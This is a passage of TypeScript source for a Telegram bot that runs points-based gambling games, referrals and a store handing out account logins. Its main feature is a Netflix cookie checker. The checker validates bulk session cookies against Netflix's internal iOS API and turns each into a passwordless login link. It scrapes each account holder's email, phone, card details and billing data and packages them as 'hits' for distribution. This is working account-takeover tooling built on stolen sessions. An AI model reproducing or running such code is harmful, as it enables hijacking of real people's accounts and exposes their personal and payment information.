                  { text: "👑 Heads", callback_data: `gc:coin:heads:${betAmount}` },
                  { text: "🔢 Tails", callback_data: `gc:coin:tails:${betAmount}` },
                ],
                [{ text: "❌ Cancel", callback_data: "game_cancel" }],
              ],
            },
          }
        );
      }

      if (gameType === "numguess") {
        gameState[userId] = { gameType, betAmount };
        const row1 = [1,2,3,4,5].map(n => ({ text: String(n), callback_data: `gc:numguess:${n}:${betAmount}` }));
        const row2 = [6,7,8,9,10].map(n => ({ text: String(n), callback_data: `gc:numguess:${n}:${betAmount}` }));
        return bot.sendMessage(chatId,
          `🔢 Number Guess\n${"─".repeat(30)}\n\n💰 Bet: ${betAmount} pts\n\nI'm thinking of a number 1-10.\nGuess it right to win!`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [row1, row2, [{ text: "❌ Cancel", callback_data: "game_cancel" }]],
            },
          }
        );
      }

      if (gameType === "horse") {
        gameState[userId] = { gameType, betAmount };
        const horses = ["⚡ Thunder", "🌩 Lightning", "🌪 Storm", "🔥 Blaze", "👤 Shadow"];
        const buttons = horses.map((h, i) => [{ text: h, callback_data: `gc:horse:${i}:${betAmount}` }]);
        buttons.push([{ text: "❌ Cancel", callback_data: "game_cancel" }]);
        return bot.sendMessage(chatId,
          `🏇 Horse Race\n${"─".repeat(30)}\n\n💰 Bet: ${betAmount} pts\n\n5 horses are racing! Pick your winner:`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }

      if (gameType === "roulette") {
        gameState[userId] = { gameType, betAmount };
        return bot.sendMessage(chatId,
          `🔫 Russian Roulette\n${"─".repeat(30)}\n\n💰 Bet: ${betAmount} pts\n\n6 chambers, 1 bullet.\nPick a chamber number (1-6).\nAvoid the bullet to win!`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [1,2,3].map(n => ({ text: `🔘 ${n}`, callback_data: `gc:roulette:${n}:${betAmount}` })),
                [4,5,6].map(n => ({ text: `🔘 ${n}`, callback_data: `gc:roulette:${n}:${betAmount}` })),
                [{ text: "❌ Cancel", callback_data: "game_cancel" }],
              ],
            },
          }
        );
      }

      if (gameType === "boxing") {
        gameState[userId] = { gameType, betAmount };
        return bot.sendMessage(chatId,
          `🥊 Boxing Match\n${"─".repeat(30)}\n\n💰 Bet: ${betAmount} pts\n\nChoose your fighting style:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "👊 Aggressive", callback_data: `gc:boxing:aggressive:${betAmount}` },
                  { text: "🛡 Defensive", callback_data: `gc:boxing:defensive:${betAmount}` },
                ],
                [
                  { text: "⚡ Counter", callback_data: `gc:boxing:counter:${betAmount}` },
                ],
                [{ text: "❌ Cancel", callback_data: "game_cancel" }],
              ],
            },
          }
        );
      }

      if (gameType === "dice" || gameType === "basketball" || gameType === "spin") {
        const canDeduct = await deductBet(user, betAmount);
        if (!canDeduct) {
          return bot.sendMessage(chatId, `❌ Insufficient Points! You need ${betAmount} to play.`, { parse_mode: "HTML" });
        }

        const emojiMap: Record<string, string> = { dice: "🎲", basketball: "🏀", spin: "🎰" };
        const emoji = emojiMap[gameType] || "🎲";

        await bot.sendMessage(chatId, `${emoji} Rolling...\n💰 Bet: ${betAmount} pts`, { parse_mode: "HTML" });
        const diceMsg = await bot.sendDice(chatId, { emoji });
        const diceValue = (diceMsg as any).dice?.value || 1;

        const delay = (ms: number) => new Promise(r => setTimeout(r, ms));
        await delay(3500);

        let won = false;
        let visual = "";
        if (gameType === "dice") {
          won = diceValue >= 4;
          visual = won ? `🎲 You rolled <b>${diceValue}</b>! High roll wins!` : `🎲 You rolled <b>${diceValue}</b>. Needed 4+ to win.`;
        } else if (gameType === "basketball") {
          won = diceValue >= 4;
          visual = won ? `🏀 Score! (${diceValue}/5) — Great shot!` : `🏀 Missed! (${diceValue}/5) — Better luck next time.`;
        } else {
          won = diceValue === 1 || diceValue === 22 || diceValue === 43 || diceValue === 64;
          visual = won ? `🎰 JACKPOT! (${diceValue}) — All matching!` : `🎰 No match (${diceValue}) — Try again!`;
        }

        await resolveGameResult(chatId, userId, gameType, betAmount, won, visual);
        return;
      }

      if (gameType === "blackjack") {
        const canDeduct = await deductBet(user, betAmount);
        if (!canDeduct) {
          return bot.sendMessage(chatId, `❌ Insufficient Points!`, { parse_mode: "HTML" });
        }

        const cards = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"];
        const suits = ["♠️", "♥️", "♦️", "♣️"];
        const randCard = () => {
          const c = cards[Math.floor(Math.random() * cards.length)];
          const s = suits[Math.floor(Math.random() * suits.length)];
          const val = c === "A" ? 11 : ["J","Q","K"].includes(c) ? 10 : parseInt(c);
          return { name: `${c}${s}`, value: val };
        };

        const p1 = randCard(), p2 = randCard();
        const d1 = randCard();
        let playerTotal = p1.value + p2.value;
        if (playerTotal > 21) playerTotal -= 10;

        gameState[userId] = { gameType, betAmount, choice: JSON.stringify({ playerCards: [p1, p2], dealerCards: [d1], playerTotal }) };

        return bot.sendMessage(chatId,
          `🃏 Blackjack\n${"─".repeat(30)}\n\n` +
          `Your cards: ${p1.name}  ${p2.name} = <b>${playerTotal}</b>\n` +
          `Dealer shows: ${d1.name}  🂠\n\n` +
          `Hit or Stand?`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "🃏 Hit", callback_data: `gc:bj:hit:${betAmount}` },
                  { text: "✋ Stand", callback_data: `gc:bj:stand:${betAmount}` },
                ],
              ],
            },
          }
        );
      }

    } catch (err: any) {
      console.error("Game error:", err.message);
    }
  }

  function formatNFCapturePlain(h: NFCheckResult, index: number): string {
    const flag = getCountryFlag(h.country || "");
    let txt = `═══════════════════════════════\n`;
    txt += `  ✅ Hit #${index} — Valid Premium Account\n`;
    txt += `═══════════════════════════════\n\n`;
    if (h.name) txt += `Name       : ${h.name}\n`;
    if (h.email) txt += `Email      : ${h.email}\n`;
    txt += `Country    : ${h.countryName || h.country || "Unknown"} ${flag} (${h.country || "?"})\n`;
    txt += `Plan       : ${h.plan || "Unknown"}\n`;
    if (h.price) txt += `Price      : ${h.price}\n`;
    if (h.memberSince) txt += `Member Since: ${h.memberSince}\n`;
    if (h.nextBilling) txt += `Next Billing: ${h.nextBilling}\n`;
    if (h.payment) txt += `Payment    : ${h.payment}\n`;
    if (h.cardInfo) txt += `Card       : ${h.cardInfo}\n`;
    if (h.phone) txt += `Phone      : ${h.phone}\n`;
    if (h.quality) txt += `Quality    : ${h.quality}\n`;
    if (h.streams) txt += `Streams    : ${h.streams}\n`;
    if (h.holdStatus) txt += `Hold Status: ${h.holdStatus}\n`;
    if (h.extraMember) txt += `Extra Member: ${h.extraMember}\n`;
    if (h.extraMemberSlot) txt += `Extra Slot : ${h.extraMemberSlot}\n`;
    if (h.emailVerified) txt += `Email Verified: ${h.emailVerified}\n`;
    if (h.membershipStatus) txt += `Status     : ${h.membershipStatus}\n`;
    if (h.profiles && h.profiles.length > 0) {
      txt += `Profiles (${h.profiles.length}): ${h.profiles.join(", ")}\n`;
    }
    txt += `\nLogin URL  : ${h.loginUrl || "N/A"}\n`;
    txt += `Expires    : ${h.expires ? h.expires.split("T")[0] : "N/A"}\n`;
    txt += `\n🍪 Cookie:\nNetflixId=${h.cookie || "N/A"}\n`;
    return txt;
  }

  function generateCaptureFile(hits: NFCheckResult[]): Buffer {
    let content = `╔═══════════════════════════════════════╗\n`;
    content += `║   NF Token Checker — Capture Results  ║\n`;
    content += `║          by @INTANETO7701             ║\n`;
    content += `╚═══════════════════════════════════════╝\n\n`;
    content += `Total Hits: ${hits.length}\n`;
    content += `Date: ${new Date().toISOString().split("T")[0]}\n\n`;
    for (let i = 0; i < hits.length; i++) {
      content += formatNFCapturePlain(hits[i], i + 1);
      content += `\n`;
    }
    content += `═══════════════════════════════\n`;
    content += `  Checked by @INTANETO7701\n`;
    content += `═══════════════════════════════\n`;
    return Buffer.from(content, "utf-8");
  }

  function formatNFHitMessage(h: NFCheckResult, index: number): string {
    const flag = getCountryFlag(h.country || "");
    let msg = `📁 <b>Source:</b> Cookie Check\n`;
    msg += `✅ <b>Status:</b> Valid Premium Account\n\n`;
    msg += `👤 <b>Account Details:</b>\n`;
    if (h.name) msg += `• <b>Name:</b> ${esc(h.name)}\n`;
    if (h.email) msg += `• <b>Email:</b> <code>${esc(h.email)}</code>\n`;
    msg += `• <b>Country:</b> ${esc(h.countryName || h.country || "Unknown")} ${flag} (${esc(h.country || "?")})\n`;
    msg += `• <b>Plan:</b> ${esc(h.plan || "Unknown")}\n`;
    if (h.price) msg += `• <b>Price:</b> ${esc(h.price)}\n`;
    if (h.memberSince) msg += `• <b>Member Since:</b> ${esc(h.memberSince)}\n`;
    if (h.nextBilling) msg += `• <b>Next Billing:</b> ${esc(h.nextBilling)}\n`;
    if (h.payment) msg += `• <b>Payment:</b> ${esc(h.payment)}\n`;
    if (h.cardInfo) msg += `• <b>Card:</b> ${esc(h.cardInfo)}\n`;
    if (h.phone) msg += `• <b>Phone:</b> ${esc(h.phone)}\n`;
    if (h.quality) msg += `• <b>Quality:</b> ${esc(h.quality)}\n`;
    if (h.streams) msg += `• <b>Streams:</b> ${esc(h.streams)}\n`;
    if (h.holdStatus) msg += `• <b>Hold Status:</b> ${esc(h.holdStatus)}\n`;
    if (h.extraMember) msg += `• <b>Extra Member:</b> ${esc(h.extraMember)}\n`;
    if (h.extraMemberSlot) msg += `• <b>Extra Member Slot:</b> ${esc(h.extraMemberSlot)}\n`;
    if (h.emailVerified) msg += `• <b>Email Verified:</b> ${esc(h.emailVerified)}\n`;
    if (h.membershipStatus) msg += `• <b>Membership Status:</b> ${esc(h.membershipStatus)}\n`;
    if (h.profiles && h.profiles.length > 0) {
      msg += `• <b>Connected Profiles:</b> ${h.profileCount || h.profiles.length}\n`;
      msg += `• <b>Profiles:</b> ${h.profiles.map(p => esc(p)).join(", ")}\n`;
    }
    msg += `\n🍪 <b>Cookie:</b>\n<code>NetflixId=${esc(h.cookie || "")}</code>`;
    msg += `\n\n🔗 <a href="${esc(h.loginUrl || "")}">Click here to login</a>`;
    return msg;
  }

  function cleanCookie(raw: string): string {
    let c = raw.trim();
    if (c.startsWith("NetflixId=")) c = c.substring("NetflixId=".length);
    if (c.startsWith("netflixid=")) c = c.substring("netflixid=".length);
    const semicolonIdx = c.indexOf(";");
    if (semicolonIdx !== -1) c = c.substring(0, semicolonIdx);
    return c.trim();
  }

  function parseCookiesFromText(text: string): string[] {
    const lines = text.split(/[\n\r]+/);
    const cookies: string[] = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.length < 10) continue;
      if (trimmed.startsWith("#") || trimmed.startsWith("//")) continue;
      const parts = trimmed.split(/[,\t|]+/);
      for (const part of parts) {
        const cleaned = cleanCookie(part);
        if (cleaned.length >= 10) {
          cookies.push(cleaned);
        }
      }
    }
    return cookies;
  }

  interface NFCheckResult {
    success: boolean;
    token?: string;
    loginUrl?: string;
    expires?: string;
    country?: string;
    countryName?: string;
    plan?: string;
    price?: string;
    email?: string;
    name?: string;
    memberSince?: string;
    nextBilling?: string;
    payment?: string;
    cardInfo?: string;
    phone?: string;
    quality?: string;
    streams?: string;
    profiles?: string[];
    profileCount?: number;
    membershipStatus?: string;
    emailVerified?: string;
    extraMember?: string;
    extraMemberSlot?: string;
    holdStatus?: string;
    error?: string;
    cookie?: string;
  }

  const COUNTRY_NAMES: Record<string, string> = {
    TR: "Turkey", US: "United States", GB: "United Kingdom", DE: "Germany", FR: "France",
    BR: "Brazil", IN: "India", JP: "Japan", KR: "South Korea", CA: "Canada", AU: "Australia",
    IT: "Italy", ES: "Spain", MX: "Mexico", AR: "Argentina", CL: "Chile", CO: "Colombia",
    SA: "Saudi Arabia", AE: "UAE", EG: "Egypt", PH: "Philippines", TH: "Thailand", ID: "Indonesia",
    MY: "Malaysia", SG: "Singapore", PK: "Pakistan", BD: "Bangladesh", NL: "Netherlands",
    BE: "Belgium", SE: "Sweden", NO: "Norway", DK: "Denmark", FI: "Finland", PL: "Poland",
    PT: "Portugal", GR: "Greece", RO: "Romania", HU: "Hungary", CZ: "Czech Republic",
    IL: "Israel", ZA: "South Africa", NG: "Nigeria", KE: "Kenya", TW: "Taiwan", HK: "Hong Kong",
  };

  function getCountryFlag(code: string): string {
    if (!code || code.length !== 2) return "🌍";
    try {
      return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
    } catch { return "🌍"; }
  }

  async function checkNetflixCookie(netflixId: string): Promise<NFCheckResult> {
    try {
      const url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
      const params = new URLSearchParams({
        appVersion: "15.48.1",
        config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        device_type: "NFAPPL-02-",
        esn: "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        idiom: "phone",
        iosVersion: "15.8.5",
        isTablet: "false",
        languages: "en-US",
        locale: "en-US",
        maxDeviceWidth: "375",
        model: "saget",
        modelType: "IPHONE8-1",
        odpAware: "true",
        path: '["account","token","default"]',
        pathFormat: "graph",
        pixelDensity: "2.0",
        progressive: "false",
        responseFormat: "json",
      });

      const headers: Record<string, string> = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.client.idiom": "phone",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.context.ab-tests": "",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": `NetflixId=${netflixId}`,
      };

      console.log(`[NF Check] Checking cookie (${netflixId.length} chars): ${netflixId.substring(0, 30)}...`);
      const res = await fetch(`${url}?${params.toString()}`, { headers, signal: AbortSignal.timeout(30000) });
      const rawText = await res.text();
      console.log(`[NF Check] HTTP ${res.status}, body length: ${rawText.length}`);

      if (res.status !== 200) return { success: false, error: `HTTP ${res.status}` };

      let data: any;
      try { data = JSON.parse(rawText); } catch { return { success: false, error: "JSON parse failed" }; }

      const account = data?.value?.account;
      if (!account) {
        console.log(`[NF Check] No account in response. Keys: ${JSON.stringify(Object.keys(data || {}))}`);
        if (data?.value) console.log(`[NF Check] value keys: ${JSON.stringify(Object.keys(data.value))}`);
        return { success: false, error: "Invalid response / expired cookie" };
      }

      console.log(`[NF Check] Account keys: ${JSON.stringify(Object.keys(account))}`);

      const tokenInfo = account?.token?.default;
      if (!tokenInfo?.token) {
        console.log(`[NF Check] No token. token keys: ${JSON.stringify(Object.keys(account?.token || {}))}`);
        return { success: false, error: "No token in response" };
      }

      const tokenValue = tokenInfo.token;
      const expiresMs = tokenInfo.expires;
      const expiresDate = new Date(expiresMs).toISOString();
      const loginUrl = `https://netflix.com/account?nftoken=${tokenValue}`;

      const result: NFCheckResult = {
        success: true,
        token: tokenValue,
        loginUrl,
        expires: expiresDate,
        country: "Unknown",
        countryName: "Unknown",
        plan: "Unknown",
        email: "",
        name: "",
        cookie: netflixId,
      };

      try {
        const deep = (obj: any, ...keys: string[]) => {
          let v = obj;
          for (const k of keys) { v = v?.[k]; if (v === undefined) return undefined; }
          return v;
        };

        result.email = account.email || account.emailAddress || deep(account, "userInfo", "email") || "";
        result.name = account.firstName || deep(account, "userInfo", "firstName") || "";

        const ms = account.membershipStatus || {};
        result.country = ms.countryOfSignup || ms.currentCountry || account.countryOfSignup || deep(account, "userInfo", "countryOfSignup") || "Unknown";
        result.countryName = COUNTRY_NAMES[result.country] || result.country;
        result.plan = ms.currentPlanName || ms.planName || deep(account, "planDetails", "planName") || "Unknown";
      } catch (err: any) {
        console.log(`[NF Check] Parse basic details error: ${err.message}`);
      }

      try {
        console.log(`[NF Check] Fetching full account details via web...`);
        const acctRes = await fetch("https://www.netflix.com/YourAccount", {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Cookie": `NetflixId=${netflixId}`,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
          },
          redirect: "follow",
          signal: AbortSignal.timeout(15000),
        });
        const html = await acctRes.text();
        console.log(`[NF Check] Account page: HTTP ${acctRes.status}, length: ${html.length}`);

        const reactMatch = html.match(/netflix\.reactContext\s*=\s*({.+?});\s*<\/script>/s);
        if (reactMatch) {
          const ctx = JSON.parse(reactMatch[1].replace(/\\x([0-9a-fA-F]{2})/g, (_, hex: string) => String.fromCharCode(parseInt(hex, 16))));
          console.log(`[NF Check] reactContext top keys: ${JSON.stringify(Object.keys(ctx))}`);

          const findInObj = (obj: any, key: string, depth = 0): any => {
            if (!obj || typeof obj !== "object" || depth > 8) return undefined;
            if (obj[key] !== undefined) return obj[key];
            for (const k of Object.keys(obj)) {
              const r = findInObj(obj[k], key, depth + 1);
              if (r !== undefined) return r;
            }
            return undefined;
          };

          if (!result.email) result.email = findInObj(ctx, "memberEmail") || findInObj(ctx, "email") || "";
          if (!result.name) result.name = findInObj(ctx, "firstName") || "";

          const country = findInObj(ctx, "countryOfSignup") || findInObj(ctx, "currentCountry") || "";
          if (country && result.country === "Unknown") {
            result.country = country;
            result.countryName = COUNTRY_NAMES[country] || country;
          }

          const plan = findInObj(ctx, "currentPlanName") || findInObj(ctx, "planName") || "";
          if (plan && result.plan === "Unknown") result.plan = plan;

          const price = findInObj(ctx, "currentPlanPrice") || findInObj(ctx, "planPrice");
          if (price) {
            const curr = findInObj(ctx, "planCurrency") || findInObj(ctx, "currencyCode") || "";
            result.price = curr ? `${price} ${curr}` : String(price);
          }

          const memberSince = findInObj(ctx, "memberSince") || findInObj(ctx, "startDate");
          if (memberSince) {
            const d = new Date(memberSince);
            if (!isNaN(d.getTime())) result.memberSince = d.toLocaleDateString("en-US", { month: "long", year: "numeric" });
          }

          const nextBill = findInObj(ctx, "nextBillingDate") || findInObj(ctx, "nextPaymentDate");
          if (nextBill) {
            const d = new Date(nextBill);
            if (!isNaN(d.getTime())) result.nextBilling = d.toLocaleDateString("en-US", { day: "numeric", month: "long", year: "numeric" });
          }

          const maxStreams = findInObj(ctx, "maxStreams") || findInObj(ctx, "numOfStreams");
          if (maxStreams) result.streams = String(maxStreams);

          const quality = findInObj(ctx, "maxResolution") || findInObj(ctx, "videoQuality");
          if (quality) result.quality = quality;

          const payType = findInObj(ctx, "paymentType") || findInObj(ctx, "mopType");
          if (payType) result.payment = payType;

          const lastFour = findInObj(ctx, "lastFour") || findInObj(ctx, "cardLastFour");
          if (lastFour) {
            const brand = findInObj(ctx, "cardBrand") || findInObj(ctx, "mopName") || "";
            result.cardInfo = brand ? `${brand} •••• ${lastFour}` : `•••• ${lastFour}`;
          }

          const phone = findInObj(ctx, "phoneNumber") || findInObj(ctx, "phone");
          if (phone) result.phone = phone;

          const emailVerified = findInObj(ctx, "isEmailVerified");
          if (emailVerified != null) result.emailVerified = emailVerified ? "Yes" : "No";

          const extraMember = findInObj(ctx, "isExtraMember");
          if (extraMember != null) result.extraMember = extraMember ? "Yes" : "No";

          const extraMemberSlot = findInObj(ctx, "extraMemberSlot") || findInObj(ctx, "extraMemberSlots");
          if (extraMemberSlot != null) result.extraMemberSlot = String(extraMemberSlot);

          const holdStatus = findInObj(ctx, "isOnHold") || findInObj(ctx, "onHold");
          if (holdStatus != null) result.holdStatus = holdStatus ? "Yes" : "No";

          const profilesList = findInObj(ctx, "profiles");
          if (Array.isArray(profilesList) && profilesList.length > 0) {
            result.profiles = profilesList.map((p: any) => p.firstName || p.profileName || p.name || "Unknown").filter((n: string) => n !== "Unknown");
            result.profileCount = result.profiles.length;
          }

          const memberStatus = findInObj(ctx, "membershipStatus") || findInObj(ctx, "currentStatus");
          if (memberStatus && typeof memberStatus === "string") result.membershipStatus = memberStatus;
        } else {
          console.log(`[NF Check] No reactContext found in page`);
        }
      } catch (err: any) {
        console.log(`[NF Check] Web account fetch error: ${err.message}`);
      }

      return result;
    } catch (err: any) {
      return { success: false, error: err.message || "Unknown error" };
    }
  }

  async function handlePurchase(chatId: number, tgUserId: number, user: any, item: any, claimedCode: any) {
    try {
      await bot.sendMessage(chatId, formatDeliveryMessage(claimedCode.code, item.name), {
        parse_mode: "HTML",
        disable_web_page_preview: true,
      });
      waitingScreenshot[tgUserId] = { itemName: item.name, username: user.username, itemId: item.id, source: "store" };
      await bot.sendMessage(chatId,
        `📸 IMPORTANT — Screenshot Required!\n` +
        `${"─".repeat(30)}\n\n` +
        `⚠️ You MUST send a screenshot after logging in to prove the account is working.\n\n` +
        `📌 Steps:\n` +
        `1️⃣ Login with the credentials above\n` +
        `2️⃣ Take a screenshot of the home screen\n` +
        `3️⃣ Send the screenshot here\n\n` +
        `❗ Failure to send a screenshot may result in account issues.`,
        { parse_mode: "HTML" }
      );
      const isOwnerPurchase = String(user.telegramId) === OWNER_ID;
      const purchaseNotif =
        `🛍️ New Purchase!\n\n` +
        `👤 User: @${esc(user.username)}\n` +
        `🎁 Item: ${esc(item.name)}\n` +
        `💰 Points spent: ${isOwnerPurchase ? "0 (Owner ∞)" : String(item.price)}\n` +
        `💳 Remaining balance: ${isOwnerPurchase ? "∞" : String((user.points || 0) - item.price)}`;
      if (OWNER_ID) {
        try { await bot.sendMessage(OWNER_ID, purchaseNotif, { parse_mode: "HTML" }); } catch (err) {
          console.error("Failed to send to owner:", err);
        }
      }
      if (SCREENSHOT_CHANNEL && SCREENSHOT_CHANNEL.trim() !== "") {
        try {
          await bot.sendMessage(SCREENSHOT_CHANNEL, purchaseNotif, { parse_mode: "HTML" });
          console.log(`✅ Purchase notification sent to proofs channel ${SCREENSHOT_CHANNEL}`);
        } catch (err: any) {
          console.error(`❌ Failed to send purchase notification to channel ${SCREENSHOT_CHANNEL}:`, err.message);
          if (OWNER_ID) {
            try { await bot.sendMessage(OWNER_ID, `⚠️ Failed to send to proofs channel: ${err.message}`); } catch {}
          }
        }
      }
    } catch (err: any) {
      console.error("Error in handlePurchase:", err.message);
    }
  }

  async function getOrCreateUser(
    tgId: string, chatId: string, username: string, startParam?: string | null
  ): Promise<{ user: any; isNew: boolean; referrerId?: string; referrerChatId?: string | null; referrerUsername?: string }> {
    let user = await storage.getUserByTelegramId(tgId);
    if (!user) user = await storage.getUserByUsername(username);
    if (!user) {
      let referrerId: string | undefined;
      let referrerChatId: string | null | undefined;
      let referrerUsername: string | undefined;
      if (startParam?.startsWith("ref_")) {
        const referralCode = startParam.replace("ref_", "");
        const referrer = await storage.getUserByReferralCode(referralCode);
        if (referrer && referrer.telegramId !== tgId) {
          referrerId = referrer.id;
          referrerChatId = referrer.chatId;
          referrerUsername = referrer.username;
          await storage.addPoints(referrer.id, 1);
        }
      }
      const referralCode = crypto.randomBytes(4).toString("hex");
      const createData: any = { username, referralCode, telegramId: tgId, chatId };
      if (referrerId) createData.referredBy = referrerId;
      user = await storage.createUser(createData);
      return { user, isNew: true, referrerId, referrerChatId, referrerUsername };
    } else {
      await storage.updateUserChatAndTelegramId(user.id, chatId, tgId);
      return { user, isNew: false };
    }
  }

  async function sendWelcome(chatId: number | string, user: any, tgUserId?: number) {
    const referrals = await storage.getReferredUsers(user.id);
    const link = `https://t.me/${BOT_USERNAME}?start=ref_${user.referralCode}`;
    const adminAccess = await isAdminOrOwner(tgUserId ?? user.telegramId ?? "");
    const ownerCheck = isBotOwner(tgUserId ?? user.telegramId ?? "");
    const ptsDisplay = ownerCheck ? "∞" : String(user.points || 0);
    let welcomeText = "";
    if (customWelcomeMessage) {
      welcomeText = customWelcomeMessage
        .replace(/\{username\}/g, esc(user.username))
        .replace(/\{points\}/g, ptsDisplay)
        .replace(/\{referrals\}/g, String(referrals.length))
        .replace(/\{referral_link\}/g, link);
    } else {
      welcomeText = `👑 Welcome back, ${esc(user.username)}!\n\n` +
        `💰 Points: <b>${ptsDisplay}</b>\n` +
        `🎯 Referrals: <b>${referrals.length}</b>\n\n` +
        `🔗 Your Referral Link:\n${link}\n\n` +
        `Invite friends and earn <b>1 point</b> per referral! 🎁\n\n` +
        `${"─".repeat(30)}\n🤖 Bot made by @INTANETO7701`;
    }
    await bot.sendMessage(chatId, welcomeText, { ...userMenu(adminAccess), parse_mode: "HTML", disable_web_page_preview: true });
  }

  async function notifyOwner(message: string) {
    for (const oid of OWNER_IDS) {
      try { await bot.sendMessage(oid, message, { parse_mode: "HTML" }); } catch {}
    }
  }

  async function notifyUser(chatId: string | null | undefined, message: string) {
    if (!chatId) return;
    try { await bot.sendMessage(chatId, message, { parse_mode: "HTML" }); } catch {}
  }

  function buildLotteryUserMessage(user: any, tgUserId: number) {
    const alreadyIn = lotteryPool.find(e => e.odId === tgUserId);
    return {
      text: `🎰 Lottery\n${"─".repeat(30)}\n\n` +
        `🎫 Entry: FREE\n` +
        `🏆 Prize: 1 point\n` +
        `👥 Players: ${lotteryPool.length}\n` +
        `${alreadyIn ? "\n✅ You are already in!" : ""}`,
      opts: {
        parse_mode: "HTML" as const,
        reply_markup: {
          inline_keyboard: alreadyIn
            ? [[{ text: "✅ Already Joined", callback_data: "noop" }]]
            : [[{ text: "🎫 Join Lottery (FREE)", callback_data: "lottery_join" }]],
        },
      },
    };
  }

  function formatTimeLeft(ms: number): string {
    const totalSec = Math.floor(ms / 1000);
    const days = Math.floor(totalSec / 86400);
    const hours = Math.floor((totalSec % 86400) / 3600);
    const minutes = Math.floor((totalSec % 3600) / 60);
    const secs = totalSec % 60;
    const parts: string[] = [];
    if (days > 0) parts.push(`${days}d`);
    if (hours > 0) parts.push(`${hours}h`);
    if (minutes > 0) parts.push(`${minutes}m`);
    if (secs > 0 || parts.length === 0) parts.push(`${secs}s`);
    return parts.join(" ");
  }

  async function endGiveaway() {
    if (!giveaway.active) return;
    giveaway.active = false;
    if (giveaway.participants.length === 0) {
      await notifyOwner(`🎁 Giveaway ended with no participants.`);
      return;
    }
    const winner = giveaway.participants[Math.floor(Math.random() * giveaway.participants.length)];
    const winnerUser = await storage.getUserByTelegramId(String(winner.odId));
    if (winnerUser) {
      await storage.addPoints(winnerUser.id, 1);
      if (winnerUser.chatId) {
        try {
          await bot.sendMessage(Number(winnerUser.chatId),
            `🎁🏆 <b>YOU WON THE GIVEAWAY!</b> 🏆🎁\n${"─".repeat(30)}\n\n💰 Prize: <b>1 point</b>\n👥 Total Participants: ${giveaway.participants.length}\n\n🎉 Congratulations!`,
            { parse_mode: "HTML" }
          );
        } catch {}
      }
    }
    const allUsers = await storage.getAllUsers();
    for (const u of allUsers) {
      if (u.isBanned || !u.chatId) continue;
      try {
        await bot.sendMessage(Number(u.chatId),
          `🎁 <b>Giveaway Results!</b>\n${"─".repeat(30)}\n\n🏆 Winner: @${esc(winner.username)}\n💰 Prize: 1 point\n👥 Participants: ${giveaway.participants.length}\n\n🎉 Congratulations!`,
          { parse_mode: "HTML" }
        );
      } catch {}
    }
    giveaway.participants = [];
  }

  // /start
  bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
    try {
      const chatId = msg.chat.id;
      const tgUserId = msg.from!.id;
      const tgUsername = msg.from!.username || msg.from!.first_name || `user_${tgUserId}`;
      const startParam = match?.[1] || null;
      if (startParam) {
        startCache[tgUserId] = startParam;
      }
      if (CHANNELS.length > 0 && !await checkAllChannels(tgUserId)) {
        const { text, opts } = await joinChannelsMsgForUser(tgUserId);
        return bot.sendMessage(chatId, text, opts);
      }
